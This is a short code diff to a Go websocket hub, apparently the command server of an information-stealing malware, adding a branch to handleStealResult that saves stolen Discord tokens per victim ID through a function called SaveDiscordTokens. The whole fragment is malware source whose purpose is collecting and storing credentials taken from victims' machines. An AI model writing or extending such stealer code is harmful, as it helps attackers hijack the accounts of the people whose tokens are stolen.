@@ -348,6 +348,12 @@ func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
 			}
 			continue
 		}
+		if key == "_discord" {
+			if err := stealstore.SaveDiscordTokens(victimID, value); err != nil {
+				log.Printf("[ws] steal discord error %s: %v", victimID, err)
+			}
+			continue
+		}
 		if value == "" {
 			continue
 		}
